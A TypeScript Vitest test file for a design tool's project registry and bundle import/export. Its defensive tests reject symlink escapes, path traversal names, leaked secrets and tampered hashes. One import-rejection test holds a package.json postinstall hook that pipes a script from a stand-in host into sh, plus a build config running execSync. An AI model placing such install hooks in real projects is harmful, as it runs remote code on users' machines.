import { afterEach, describe, expect, it } from 'vitest';
import { mkdtemp, mkdir, readFile, readdir, rm, symlink, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { DocumentStore, DomainError, digest } from '../../packages/document-core/src/index';
import { ProjectWorkspace } from '../../packages/project-workspace/src/index';
import type { ChangeSet, Project, RuntimeFrame } from '../../packages/protocol/src/index';

const directories: string[] = [];
const repoRoot = path.resolve(import.meta.dirname, '../..');
const sourceText = 'export const View = () => <main data-rdesign-id="view">Linked project</main>;\n';
const sourceHtml = '<!doctype html><html><body><div id="root"></div><script type="module" src="/src/main.tsx"></script></body></html>\n';
const pngBytes = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+aEIoAAAAASUVORK5CYII=', 'base64');

function woffBytes() {
  const bytes = Buffer.alloc(68);
  bytes.write('wOFF');
  bytes.writeUInt32BE(0x00010000, 4);
  bytes.writeUInt32BE(bytes.length, 8);
  bytes.writeUInt16BE(1, 12);
  bytes.writeUInt32BE(32, 16);
  bytes.writeUInt16BE(1, 20);
  bytes.write('head', 44);
  bytes.writeUInt32BE(64, 48);
  bytes.writeUInt32BE(4, 52);
  bytes.writeUInt32BE(4, 56);
  return bytes;
}

afterEach(async () => {
  await Promise.all(directories.splice(0).map(directory => rm(directory, { recursive: true, force: true })));
});

async function workspace() {
  const root = await mkdtemp(path.join(os.tmpdir(), 'rd-workspace-'));
  directories.push(root);
  const directory = path.join(root, 'data');
  const legacyWorkspace = path.join(root, 'linked-source');
  await mkdir(path.join(legacyWorkspace, 'src'), { recursive: true });
  await writeFile(path.join(legacyWorkspace, 'src/main.tsx'), sourceText);
  await writeFile(path.join(legacyWorkspace, 'index.html'), sourceHtml);
  const store = await new DocumentStore(directory).load('linked-code-v1');
  const originalDocument = await readFile(path.join(directory, 'project.json'), 'utf8');
  const catalog = await new ProjectWorkspace(directory, legacyWorkspace, repoRoot).load(store.project);
  return { root, directory, legacyWorkspace, store, catalog, originalDocument };
}

async function mutate<T>(catalog: ProjectWorkspace, operationId: string, fingerprint: string, mutation: () => T | Promise<T>) {
  return catalog.write({ expectedRevision: catalog.catalog.revision, operationId }, fingerprint, mutation);
}

async function ownedDirectories(directory: string) {
  try { return await readdir(path.join(directory, 'projects')); }
  catch (error) { if ((error as NodeJS.ErrnoException).code === 'ENOENT') return []; throw error; }
}

type ProjectBundle = Awaited<ReturnType<ProjectWorkspace['export']>>;

function resign(bundle: ProjectBundle) {
  const { checksum: _checksum, ...payload } = bundle;
  bundle.checksum = digest(JSON.stringify(payload));
  return bundle;
}

function withFile(bundle: ProjectBundle, filePath: string, content: string) {
  const next = structuredClone(bundle);
  next.sourceFiles = next.sourceFiles.filter(file => file.path !== filePath);
  next.sourceFiles.push({ path: filePath, content, sha256: digest(content) });
  return resign(next);
}

function withBinaryFile(bundle: ProjectBundle, filePath: string, bytes: Buffer) {
  const next = structuredClone(bundle);
  next.sourceFiles = next.sourceFiles.filter(file => file.path !== filePath);
  next.sourceFiles.push({ path: filePath, content: bytes.toString('base64'), encoding: 'base64', sha256: digest(bytes) });
  return resign(next);
}

function documentWithReferences(project: Project): { schemaVersion: 1; project: Project; changes: ChangeSet[] } {
  const next = structuredClone(project);
  const frame: RuntimeFrame = {
    id: 'snapshot-source', kind: 'snapshot', timestamp: '2026-10-08T00:00:00.000Z',
    width: 1, height: 1, image: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+aEIoAAAAASUVORK5CYII=',
    runtimeSessionId: 'session-source', epoch: 1, surfaceId: 'surface-source',
    codeRevision: project.codeRevision, treeRevision: 1, viewportRevision: 1, geometryRevision: 1,
    nodes: [], status: 'frozen',
  };
  next.snapshots = [frame];
  next.scenarios = [{ id: 'scenario-source', name: '首页', route: '/', viewport: { width: 1, height: 1 }, steps: [], readySelector: 'body', dependencies: ['src/main.tsx'], status: 'fresh', snapshotId: frame.id }];
  next.annotations = [{
    id: 'annotation-source', projectId: project.id, revision: 1, createdAt: frame.timestamp,
    anchor: { type: 'snapshot', frameId: frame.id, bounds: { x: 0, y: 0, w: 1, h: 1 }, version: frame },
    text: '调整间距', strokes: [], status: 'confirmed',
  }];
  const patch = { file: 'src/main.tsx', before: sourceText, after: sourceText.replace('Linked project', 'Candidate'), beforeHash: digest(sourceText), afterHash: digest(sourceText.replace('Linked project', 'Candidate')) };
  const change: ChangeSet = {
    id: 'change-source', projectId: project.id, operationId: 'source-operation', expectedRevision: 1,
    status: 'verified', intent: '调整间距', createdAt: frame.timestamp, baseCodeRevision: project.codeRevision,
    diffHash: digest(JSON.stringify([patch])), patches: [patch], evidence: [{ name: '来源快照', passed: true, detail: 'Captured', snapshot: frame }],
    candidateFrame: { ...frame, id: 'candidate-source', kind: 'candidate' }, annotationId: next.annotations[0].id,
  };
  Object.assign(change, { relations: { projectId: project.id, changeId: change.id, changeSetId: change.id, candidateId: change.id } });
  return { schemaVersion: 1, project: next, changes: [change] };
}

describe('durable project registry', () => {
  it('registers the existing workspace without replacing its document or source', async () => {
    const fixture = await workspace();
    const { catalog, store, directory, legacyWorkspace, originalDocument } = fixture;
    expect(catalog.catalog).toMatchObject({ revision: 1, activeProjectId: store.project.id, canManage: true });
    expect(catalog.catalog.projects).toHaveLength(1);
    const linked = await catalog.get(store.project.id);
    expect(linked.summary).toMatchObject({ id: store.project.id, kind: 'linked', name: store.project.name, favorite: false, archived: false, location: legacyWorkspace });
    expect(linked.sourceDirectory).toBe(legacyWorkspace);
    expect(linked.dataDirectory).toBe(directory);
    expect(JSON.parse(await readFile(path.join(directory, 'workspace.json'), 'utf8'))).toMatchObject({ schemaVersion: 1 });
    expect(JSON.parse(await readFile(path.join(directory, 'rdesign.project.json'), 'utf8'))).toMatchObject({ schemaVersion: 1, id: store.project.id, source: { kind: 'linked', directory: legacyWorkspace } });
    await mutate(catalog, 'rename-linked-operation', 'rename', () => catalog.update(store.project.id, { name: '保留源码', favorite: true }));
    expect(await readFile(path.join(directory, 'project.json'), 'utf8')).toBe(originalDocument);
    expect(await readFile(path.join(legacyWorkspace, 'src/main.tsx'), 'utf8')).toBe(sourceText);
    const reopened = await new ProjectWorkspace(directory, legacyWorkspace, repoRoot).load(store.project);
    expect(reopened.catalog.projects[0]).toMatchObject({ name: '保留源码', favorite: true, kind: 'linked' });
    expect(reopened.catalog.revision).toBe(2);
  });

  it('serializes competing clients and deduplicates the accepted result after restart', async () => {
    const { catalog, directory, legacyWorkspace, store } = await workspace();
    const envelope = { expectedRevision: 1, operationId: 'create-blank-operation' };
    let executions = 0;
    const summary = await catalog.write(envelope, 'same', async () => { executions++; return catalog.create('页面草稿', 'blank'); });
    expect(catalog.catalog.revision).toBe(2);
    expect(await catalog.write(envelope, 'same', () => { executions++; throw new Error('must not repeat'); })).toEqual(summary);
    expect(executions).toBe(1);
    const reopened = await new ProjectWorkspace(directory, legacyWorkspace, repoRoot).load(store.project);
    expect(await reopened.write(envelope, 'same', () => { throw new Error('must not repeat after restart'); })).toEqual(summary);
    expect(reopened.catalog.projects.filter(project => project.id === summary.id)).toHaveLength(1);
    await expect(reopened.write({ ...envelope, operationId: 'stale-client-operation' }, 'new', () => 1)).rejects.toMatchObject({ code: 'REVISION_CONFLICT' });
    await expect(reopened.write(envelope, 'different', () => 1)).rejects.toMatchObject({ code: 'OPERATION_COLLISION' });
    const settled = await Promise.allSettled([
      reopened.write({ expectedRevision: 2, operationId: 'client-alpha-operation' }, 'alpha', () => 1),
      reopened.write({ expectedRevision: 2, operationId: 'client-bravo-operation' }, 'bravo', () => 2),
    ]);
    expect(settled.filter(result => result.status === 'fulfilled')).toHaveLength(1);
    expect(reopened.catalog.revision).toBe(3);
  });

  it('restores registry state and records failed mutations without replaying them', async () => {
    const { catalog, store, directory, legacyWorkspace } = await workspace();
    const name = catalog.catalog.projects[0].name;
    const envelope = { expectedRevision: 1, operationId: 'invalid-rename-operation' };
    let executions = 0;
    await expect(catalog.write(envelope, 'failed', async () => {
      executions++;
      await catalog.update(store.project.id, { name: '不可保存' });
      throw new DomainError('INVALID', 'invalid mutation', 400);
    })).rejects.toMatchObject({ code: 'INVALID' });
    expect(catalog.catalog.revision).toBe(1);
    expect(catalog.catalog.projects[0].name).toBe(name);
    const reopened = await new ProjectWorkspace(directory, legacyWorkspace, repoRoot).load(store.project);
    await expect(reopened.write(envelope, 'failed', () => { executions++; })).rejects.toMatchObject({ code: 'INVALID' });
    expect(executions).toBe(1);
    expect(reopened.catalog.projects[0].name).toBe(name);
  });

  it('fences side effects after receipt failure and refuses to replay uncertain writes after restart', async () => {
    const { catalog, directory, legacyWorkspace, store } = await workspace();
    const originalSave = catalog.save.bind(catalog);
    let saves = 0, executions = 0;
    catalog.save = async () => {
      saves++;
      if (saves === 2) throw Object.assign(new Error('disk full'), { code: 'ENOSPC' });
      await originalSave();
    };
    const envelope = { expectedRevision: 1, operationId: 'receipt-fault-operation' };
    await expect(catalog.write(envelope, 'same', () => { executions++; return { delivered: true }; })).rejects.toMatchObject({ code: 'STORE_SAVE_FAILED' });
    expect(executions).toBe(1);
    expect(catalog.catalog.revision).toBe(2);
    const interrupted = await new ProjectWorkspace(directory, legacyWorkspace, repoRoot).load(store.project);
    await expect(interrupted.write(envelope, 'same', () => { executions++; })).rejects.toMatchObject({ code: 'OPERATION_OUTCOME_UNKNOWN' });
    expect(await catalog.write(envelope, 'same', () => { executions++; return { delivered: false }; })).toEqual({ delivered: true });
    const reopened = await new ProjectWorkspace(directory, legacyWorkspace, repoRoot).load(store.project);
    expect(await reopened.write(envelope, 'same', () => { executions++; return null; })).toEqual({ delivered: true });
    expect(executions).toBe(1);
  });

  it('executes no mutation when the durable start fence cannot be saved', async () => {
    const { catalog } = await workspace();
    const originalSave = catalog.save.bind(catalog);
    let saves = 0, executions = 0;
    catalog.save = async () => { if (++saves === 1) throw new Error('unavailable'); await originalSave(); };
    const envelope = { expectedRevision: 1, operationId: 'start-fault-operation' };
    await expect(catalog.write(envelope, 'same', () => { executions++; return true; })).rejects.toMatchObject({ code: 'STORE_SAVE_FAILED' });
    expect(executions).toBe(0);
    expect(catalog.catalog.revision).toBe(1);
    expect(await catalog.write(envelope, 'same', () => { executions++; return true; })).toBe(true);
    expect(executions).toBe(1);
    expect(catalog.catalog.revision).toBe(2);
  });

  it('refuses new mutations while completed receipts cannot be persisted', async () => {
    const { catalog } = await workspace();
    const originalSave = catalog.save.bind(catalog);
    let saves = 0, executions = 0;
    catalog.save = async () => { if (++saves >= 2) throw new Error('unavailable'); await originalSave(); };
    await expect(catalog.write({ expectedRevision: 1, operationId: 'blocked-alpha-operation' }, 'alpha', () => { executions++; })).rejects.toMatchObject({ code: 'STORE_SAVE_FAILED' });
    await expect(catalog.write({ expectedRevision: 2, operationId: 'blocked-bravo-operation' }, 'bravo', () => { executions++; })).rejects.toMatchObject({ code: 'STORE_SAVE_FAILED' });
    expect(executions).toBe(1);
  });
});

describe('independent owned projects', () => {
  it('creates blank and monitor source/document directories without sharing writable files', async () => {
    const { catalog, directory, legacyWorkspace, store, originalDocument } = await workspace();
    const blank = await mutate(catalog, 'create-blank-operation', 'blank', () => catalog.create('空白画布', 'blank'));
    const monitor = await mutate(catalog, 'create-monitor-operation', 'monitor', () => catalog.create('设备监控', 'react-monitor'));
    const blankEntry = await catalog.get(blank.id);
    const monitorEntry = await catalog.get(monitor.id);
    expect(blank).toMatchObject({ kind: 'owned', template: 'blank', documentRevision: 1, archived: false });
    expect(monitor).toMatchObject({ kind: 'owned', template: 'react-monitor', documentRevision: 1 });
    expect(blank.id).not.toBe(monitor.id);
    for (const entry of [blankEntry, monitorEntry]) {
      expect(entry.directory.startsWith(path.join(directory, 'projects') + path.sep)).toBe(true);
      expect(path.basename(entry.directory)).toMatch(/^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$/i);
      expect(entry.sourceDirectory).toBe(path.join(entry.directory, 'source'));
      expect(entry.dataDirectory).toBe(path.join(entry.directory, '.rdesign'));
      const document = JSON.parse(await readFile(path.join(entry.dataDirectory, 'project.json'), 'utf8'));
      expect(document.project).toMatchObject({ id: entry.summary.id, name: entry.summary.name, revision: 1 });
      expect(JSON.parse(await readFile(path.join(entry.directory, 'rdesign.project.json'), 'utf8'))).toMatchObject({ schemaVersion: 1, id: entry.summary.id, source: { kind: 'owned' } });
    }
    const templateSource = await readFile(path.join(repoRoot, 'fixtures/react-monitor/src/main.tsx'), 'utf8');
    const monitorSource = await readFile(path.join(monitorEntry.sourceDirectory, 'src/main.tsx'), 'utf8');
    expect(monitorSource).toBe(templateSource);
    const blankSource = await readFile(path.join(blankEntry.sourceDirectory, 'src/main.tsx'), 'utf8');
    expect(blankSource).not.toBe(monitorSource);
    await writeFile(path.join(blankEntry.sourceDirectory, 'src/main.tsx'), '// blank edit\n');
    await writeFile(path.join(monitorEntry.sourceDirectory, 'src/main.tsx'), '// monitor edit\n');
    expect(await readFile(path.join(repoRoot, 'fixtures/react-monitor/src/main.tsx'), 'utf8')).toBe(templateSource);
    expect(await readFile(path.join(legacyWorkspace, 'src/main.tsx'), 'utf8')).toBe(sourceText);
    expect(await readFile(path.join(directory, 'project.json'), 'utf8')).toBe(originalDocument);
    await mutate(catalog, 'activate-monitor-operation', 'activate', () => catalog.setActive(monitor.id));
    const reopened = await new ProjectWorkspace(directory, legacyWorkspace, repoRoot).load(store.project);
    expect(reopened.catalog.activeProjectId).toBe(monitor.id);
    expect(reopened.catalog.projects).toHaveLength(3);
  });

  it('preserves favorites and archived history while preventing an archived active project', async () => {
    const { catalog, store, directory, legacyWorkspace } = await workspace();
    const draft = await mutate(catalog, 'create-draft-operation', 'draft', () => catalog.create('草稿', 'blank'));
    await mutate(catalog, 'favorite-draft-operation', 'favorite', () => catalog.update(draft.id, { favorite: true, name: '收藏草稿' }));
    await mutate(catalog, 'activate-draft-operation', 'active', () => catalog.setActive(draft.id));
    await expect(mutate(catalog, 'archive-active-operation', 'archive-active', () => catalog.update(draft.id, { archived: true }))).rejects.toMatchObject({ code: 'PROJECT_ACTIVE' });
    await mutate(catalog, 'activate-linked-operation', 'linked', () => catalog.setActive(store.project.id));
    await mutate(catalog, 'archive-draft-operation', 'archive', () => catalog.update(draft.id, { archived: true }));
    await expect(mutate(catalog, 'activate-archived-operation', 'archived', () => catalog.setActive(draft.id))).rejects.toThrow();
    const reopened = await new ProjectWorkspace(directory, legacyWorkspace, repoRoot).load(store.project);
    expect(reopened.catalog.projects.find(project => project.id === draft.id)).toMatchObject({ name: '收藏草稿', favorite: true, archived: true });
    expect(reopened.catalog.activeProjectId).toBe(store.project.id);
  });

  it('refreshes document metadata and a thumbnail without advancing the catalog revision', async () => {
    const { catalog, store, directory, legacyWorkspace, originalDocument } = await workspace();
    const document = documentWithReferences(store.project).project;
    document.revision = 7;
    document.codeRevision = 'refreshed-code-v7';
    document.assets = [{ id: 'asset-thumbnail', name: '预览图', kind: 'reference', mime: 'image/png', hash: digest(pngBytes), url: document.snapshots[0].image, createdAt: document.snapshots[0].timestamp, provenance: { provider: 'fixture' } }];
    document.designFrames = [{ id: 'design-thumbnail', name: '画板', nodes: [] }];
    const stored = JSON.parse(originalDocument);
    stored.changes = documentWithReferences(store.project).changes;
    const seededDocument = JSON.stringify(stored);
    await writeFile(path.join(directory, 'project.json'), seededDocument);
    await catalog.refresh(document.id, document, document.snapshots[0]);
    expect(catalog.catalog.revision).toBe(1);
    expect(catalog.catalog.projects).toHaveLength(1);
    expect(catalog.catalog.projects[0]).toMatchObject({ id: document.id, documentRevision: 7, codeRevision: 'refreshed-code-v7', frameCount: 2, assetCount: 1, changeCount: 1, thumbnail: document.snapshots[0].image });
    expect(await readFile(path.join(directory, 'project.json'), 'utf8')).toBe(seededDocument);
    const reopened = await new ProjectWorkspace(directory, legacyWorkspace, repoRoot).load(store.project);
    expect(reopened.catalog.revision).toBe(1);
    expect(reopened.catalog.projects[0]).toMatchObject({ documentRevision: 7, codeRevision: 'refreshed-code-v7', frameCount: 2, assetCount: 1, changeCount: 1, thumbnail: document.snapshots[0].image });
  });

  it.each(['source-directory', 'data-directory', 'document-file', 'manifest-file'])('revalidates %s after it is replaced by a symlink', async target => {
    const { catalog, root } = await workspace();
    const project = await mutate(catalog, 'create-validation-operation', 'validation-project', () => catalog.create('目录验证', 'blank'));
    const entry = await catalog.validate(project.id);
    const outside = path.join(root, 'outside-validation');
    await mkdir(outside);
    const sentinel = path.join(outside, 'sentinel.txt');
    await writeFile(sentinel, 'preserve-outside');
    const replacement = target === 'source-directory' ? entry.sourceDirectory
      : target === 'data-directory' ? entry.dataDirectory
      : target === 'document-file' ? path.join(entry.dataDirectory, 'project.json')
      : path.join(entry.directory, 'rdesign.project.json');
    await rm(replacement, { recursive: true, force: true });
    await symlink(target.endsWith('directory') ? outside : sentinel, replacement);
    await expect(catalog.validate(project.id)).rejects.toMatchObject({ code: 'PROJECT_PATH_FORBIDDEN' });
    expect(await readFile(sentinel, 'utf8')).toBe('preserve-outside');
    expect(await readdir(outside)).toEqual(['sentinel.txt']);
  });
});

describe('portable project bundles', () => {
  it('exports hashes and imports an independent identity while retaining internal references', async () => {
    const { catalog, store, directory, legacyWorkspace } = await workspace();
    const document = documentWithReferences(store.project);
    const bundle = await catalog.export(store.project.id, document);
    expect(bundle).toMatchObject({ format: 'rdesign-project', schemaVersion: 1, manifest: { id: store.project.id }, document: { schemaVersion: 1, project: { id: store.project.id } } });
    const { checksum, ...payload } = bundle;
    expect(checksum).toBe(digest(JSON.stringify(payload)));
    expect(bundle.sourceFiles.find(file => file.path === 'src/main.tsx')).toEqual({ path: 'src/main.tsx', content: sourceText, sha256: digest(sourceText) });
    const imported = await mutate(catalog, 'import-project-operation', 'import', () => catalog.import(bundle));
    const entry = await catalog.get(imported.id);
    const importedDocument = JSON.parse(await readFile(path.join(entry.dataDirectory, 'project.json'), 'utf8')) as { project: Project; changes: ChangeSet[] };
    expect(imported.id).not.toBe(store.project.id);
    expect(imported.kind).toBe('owned');
    expect(importedDocument.project.id).toBe(imported.id);
    expect(importedDocument.project.annotations[0].projectId).toBe(imported.id);
    expect(importedDocument.changes[0].projectId).toBe(imported.id);
    expect(importedDocument.changes[0].id).not.toBe(document.changes[0].id);
    expect(importedDocument.changes[0].status).toBe('discarded');
    expect(importedDocument.project.revision).toBe(1);
    expect(importedDocument.project.scenarios[0].status).toBe('unverified');
    expect((importedDocument.changes[0] as ChangeSet & { relations: unknown }).relations).toEqual({ projectId: imported.id, changeId: importedDocument.changes[0].id, changeSetId: importedDocument.changes[0].id, candidateId: importedDocument.changes[0].id });
    expect(importedDocument.changes[0].annotationId).toBe(importedDocument.project.annotations[0].id);
    expect(importedDocument.project.annotations[0].anchor.frameId).toBe(importedDocument.project.snapshots[0].id);
    expect(importedDocument.project.scenarios[0].snapshotId).toBe(importedDocument.project.snapshots[0].id);
    expect(await readFile(path.join(entry.sourceDirectory, 'src/main.tsx'), 'utf8')).toBe(sourceText);
    await writeFile(path.join(entry.sourceDirectory, 'src/main.tsx'), '// import edit\n');
    expect(await readFile(path.join(legacyWorkspace, 'src/main.tsx'), 'utf8')).toBe(sourceText);
    const reopened = await new ProjectWorkspace(directory, legacyWorkspace, repoRoot).load(store.project);
    expect(reopened.catalog.projects.filter(project => project.id === imported.id)).toHaveLength(1);
  });

  it('excludes secrets, generated directories, and symlink targets from source exports', async () => {
    const { catalog, store, root, legacyWorkspace } = await workspace();
    await writeFile(path.join(legacyWorkspace, '.env'), 'SECRET_TOKEN=do-not-export\n');
    await writeFile(path.join(legacyWorkspace, '.env.local'), 'SECRET_TOKEN=do-not-export\n');
    await writeFile(path.join(legacyWorkspace, 'private.pem'), '-----BEGIN PRIVATE KEY-----\ndo-not-export\n');
    await mkdir(path.join(legacyWorkspace, 'node_modules/private-module'), { recursive: true });
    await writeFile(path.join(legacyWorkspace, 'node_modules/private-module/index.ts'), 'do-not-export');
    await mkdir(path.join(legacyWorkspace, '.rdesign'), { recursive: true });
    await writeFile(path.join(legacyWorkspace, '.rdesign/secret.json'), 'do-not-export');
    await writeFile(path.join(root, 'outside.ts'), 'do-not-export');
    await symlink(path.join(root, 'outside.ts'), path.join(legacyWorkspace, 'linked.ts'));
    await symlink(root, path.join(legacyWorkspace, 'linked-directory'));
    const bundle = await catalog.export(store.project.id, { schemaVersion: 1, project: store.project, changes: [] });
    expect(bundle.sourceFiles.map(file => file.path)).toEqual(['index.html', 'src/main.tsx']);
    expect(JSON.stringify(bundle.sourceFiles)).not.toContain('do-not-export');
  });

  it('rejects tampered checksums and individual source hashes before creating a project', async () => {
    const { catalog, store, directory } = await workspace();
    const bundle = await catalog.export(store.project.id, { schemaVersion: 1, project: store.project, changes: [] });
    const badChecksum = structuredClone(bundle);
    badChecksum.document.project.name = 'tampered';
    await expect(catalog.import(badChecksum)).rejects.toThrow();
    const badHash = structuredClone(bundle);
    badHash.sourceFiles[0].content += '// tampered\n';
    resign(badHash);
    await expect(catalog.import(badHash)).rejects.toThrow();
    expect(catalog.catalog.projects).toHaveLength(1);
    expect(await ownedDirectories(directory)).toEqual([]);
  });

  it.each(['../outside.ts', 'src/../../outside.ts', '/tmp/outside.ts', 'C:\\outside.ts', 'src\\..\\outside.ts', 'src/invalid\u0000.ts'])('rejects unsafe source path %j even with valid hashes', async unsafePath => {
    const { catalog, store, root, directory } = await workspace();
    const bundle = await catalog.export(store.project.id, { schemaVersion: 1, project: store.project, changes: [] });
    await expect(catalog.import(withFile(bundle, unsafePath, 'export const unsafe = true;\n'))).rejects.toThrow();
    expect(catalog.catalog.projects).toHaveLength(1);
    expect(await ownedDirectories(directory)).toEqual([]);
    await expect(readFile(path.join(root, 'outside.ts'), 'utf8')).rejects.toMatchObject({ code: 'ENOENT' });
  });

  it.each(['src/main.tsx', 'src/./main.tsx', 'src//main.tsx'])('rejects duplicate or aliased source path %j', async alias => {
    const { catalog, store, directory } = await workspace();
    const bundle = await catalog.export(store.project.id, { schemaVersion: 1, project: store.project, changes: [] });
    bundle.sourceFiles.push({ path: alias, content: sourceText, sha256: digest(sourceText) });
    resign(bundle);
    await expect(catalog.import(bundle)).rejects.toThrow();
    expect(await ownedDirectories(directory)).toEqual([]);
  });

  it.each([
    ['src/caf\u00e9.ts', 'src/cafe\u0301.ts'],
    ['src/caf\u00e9/one.ts', 'src/cafe\u0301/two.ts'],
    ['src/feature.ts', 'src/feature.ts/child.ts'],
    ['src/Feature/one.ts', 'src/feature/two.ts'],
  ])('rejects Unicode/case or file-directory aliases %j and %j before any project writes', async (first,second) => {
    const {catalog,store,directory}=await workspace();const bundle=await catalog.export(store.project.id,{schemaVersion:1,project:store.project,changes:[]});const before=await readFile(path.join(directory,'workspace.json'),'utf8');const count=catalog.catalog.projects.length;
    bundle.sourceFiles.push({path:first,content:'export const first = 1;\n',sha256:digest('export const first = 1;\n')},{path:second,content:'export const second = 2;\n',sha256:digest('export const second = 2;\n')});resign(bundle);
    await expect(catalog.import(bundle)).rejects.toMatchObject({code:'IMPORT_PATH'});expect(catalog.catalog.projects).toHaveLength(count);expect(await ownedDirectories(directory)).toEqual([]);expect(await readFile(path.join(directory,'workspace.json'),'utf8')).toBe(before);
  });

  it('does not enumerate private source through a top-level src symlink', async () => {
    const { catalog, store, root, legacyWorkspace } = await workspace();
    const outside = path.join(root, 'outside-source');
    await mkdir(outside);
    await writeFile(path.join(outside, 'private.ts'), 'private-symlink-bytes');
    await rm(path.join(legacyWorkspace, 'src'), { recursive: true });
    await symlink(outside, path.join(legacyWorkspace, 'src'));
    const [result] = await Promise.allSettled([catalog.export(store.project.id, { schemaVersion: 1, project: store.project, changes: [] })]);
    if (result.status === 'fulfilled') expect(JSON.stringify(result.value.sourceFiles)).not.toContain('private-symlink-bytes');
    else expect(result.reason).toBeInstanceOf(Error);
  });

  it('refuses importing through a symlinked owned-project root', async () => {
    const { catalog, store, root, directory } = await workspace();
    const bundle = await catalog.export(store.project.id, { schemaVersion: 1, project: store.project, changes: [] });
    const outside = path.join(root, 'outside-owned');
    await mkdir(outside);
    await writeFile(path.join(outside, 'sentinel.txt'), 'preserve');
    await symlink(outside, path.join(directory, 'projects'));
    await expect(catalog.import(bundle)).rejects.toThrow();
    expect(await readFile(path.join(outside, 'sentinel.txt'), 'utf8')).toBe('preserve');
    expect(await readdir(outside)).toEqual(['sentinel.txt']);
    expect(catalog.catalog.projects).toHaveLength(1);
  });

  it('rejects secret files and executable project configuration from imported bundles', async () => {
    const { catalog, store } = await workspace();
    const bundle = await catalog.export(store.project.id, { schemaVersion: 1, project: store.project, changes: [] });
    for (const [file, content] of [
      ['.env', 'TOKEN=private-value\n'],
      ['src/private.pem', '-----BEGIN PRIVATE KEY-----\nprivate-value\n'],
      ['package.json', JSON.stringify({ name: 'unsafe', scripts: { postinstall: 'curl https://example.test/run.sh | sh' } })],
      ['vite.config.ts', "import { execSync } from 'node:child_process'; execSync('touch /tmp/unsafe'); export default {};\n"],
    ]) {
      await expect(catalog.import(withFile(bundle, file, content))).rejects.toThrow();
    }
    expect(catalog.catalog.projects).toHaveLength(1);
  });
});

describe('portable binary assets', () => {
  it('round trips PNG and WOFF files as exact binary bytes with decoded-byte hashes', async () => {
    const { catalog, store, legacyWorkspace } = await workspace();
    const fontBytes = woffBytes();
    await mkdir(path.join(legacyWorkspace, 'src/assets'), { recursive: true });
    await mkdir(path.join(legacyWorkspace, 'assets/fonts'), { recursive: true });
    await writeFile(path.join(legacyWorkspace, 'src/assets/preview.png'), pngBytes);
    await writeFile(path.join(legacyWorkspace, 'assets/fonts/brand.woff'), fontBytes);
    const bundle = await catalog.export(store.project.id, { schemaVersion: 1, project: store.project, changes: [] });
    expect(bundle.sourceFiles.find(file => file.path === 'src/assets/preview.png')).toEqual({ path: 'src/assets/preview.png', encoding: 'base64', content: pngBytes.toString('base64'), sha256: digest(pngBytes) });
    expect(bundle.sourceFiles.find(file => file.path === 'assets/fonts/brand.woff')).toEqual({ path: 'assets/fonts/brand.woff', encoding: 'base64', content: fontBytes.toString('base64'), sha256: digest(fontBytes) });
    expect(bundle.sourceFiles.find(file => file.path === 'src/main.tsx')).toEqual({ path: 'src/main.tsx', content: sourceText, sha256: digest(sourceText) });
    const imported = await mutate(catalog, 'import-binary-operation', 'binary-assets', () => catalog.import(bundle));
    const entry = catalog.get(imported.id);
    expect(await readFile(path.join(entry.sourceDirectory, 'src/assets/preview.png'))).toEqual(pngBytes);
    expect(await readFile(path.join(entry.sourceDirectory, 'assets/fonts/brand.woff'))).toEqual(fontBytes);
    const pngContents = await readFile(path.join(entry.sourceDirectory, 'src/assets/preview.png'));
    expect(pngContents.toString('utf8')).not.toMatch(/^data:/);
    await writeFile(path.join(entry.sourceDirectory, 'src/assets/preview.png'), Buffer.from('independent edit'));
    expect(await readFile(path.join(legacyWorkspace, 'src/assets/preview.png'))).toEqual(pngBytes);
  });

  it.each(['invalid-character', 'line-break', 'extra-padding', 'missing-padding'])('rejects %s base64 despite a valid aggregate checksum', async attack => {
    const { catalog, store, directory } = await workspace();
    const original = await catalog.export(store.project.id, { schemaVersion: 1, project: store.project, changes: [] });
    const bundle = withBinaryFile(original, 'assets/preview.png', pngBytes);
    const file = bundle.sourceFiles.find(source => source.path === 'assets/preview.png')!;
    if (attack === 'invalid-character') file.content = `!${file.content.slice(1)}`;
    if (attack === 'line-break') file.content += '\n';
    if (attack === 'extra-padding') file.content += '=';
    if (attack === 'missing-padding') file.content = file.content.replace(/=+$/, '');
    file.sha256 = digest(Buffer.from(file.content, 'base64'));
    resign(bundle);
    await expect(catalog.import(bundle)).rejects.toThrow();
    expect(await ownedDirectories(directory)).toEqual([]);
  });

  it('rejects binary hash mismatches, forged signatures and executable extensions before writing', async () => {
    const { catalog, store, directory } = await workspace();
    const original = await catalog.export(store.project.id, { schemaVersion: 1, project: store.project, changes: [] });
    const badHash = withBinaryFile(original, 'assets/preview.png', pngBytes);
    badHash.sourceFiles.find(file => file.path === 'assets/preview.png')!.sha256 = digest(Buffer.from('different bytes'));
    resign(badHash);
    const wrongSignature = withBinaryFile(original, 'assets/preview.png', woffBytes());
    const executable = withBinaryFile(original, 'assets/run.exe', Buffer.from('MZexecutable'));
    const binarySource = withBinaryFile(original, 'src/main.tsx', pngBytes);
    for (const bundle of [badHash, wrongSignature, executable, binarySource]) await expect(catalog.import(bundle)).rejects.toThrow();
    expect(await ownedDirectories(directory)).toEqual([]);
    expect(catalog.catalog.projects).toHaveLength(1);
  });

  it('enforces decoded file and aggregate bundle limits for binary assets', async () => {
    const { catalog, store, directory } = await workspace();
    const original = await catalog.export(store.project.id, { schemaVersion: 1, project: store.project, changes: [] });
    const oversized = Buffer.alloc(1024 * 1024 + 1);
    pngBytes.copy(oversized);
    await expect(catalog.import(withBinaryFile(original, 'assets/oversized.png', oversized))).rejects.toThrow();
    const bytes = oversized.subarray(0, 1024 * 1024);
    const bundle = structuredClone(original);
    for (let index = 0; index < 25; index++) bundle.sourceFiles.push({ path: `assets/image-${index}.png`, encoding: 'base64', content: bytes.toString('base64'), sha256: digest(bytes) });
    resign(bundle);
    await expect(catalog.import(bundle)).rejects.toThrow();
    expect(await ownedDirectories(directory)).toEqual([]);
    expect(catalog.catalog.projects).toHaveLength(1);
  });
});
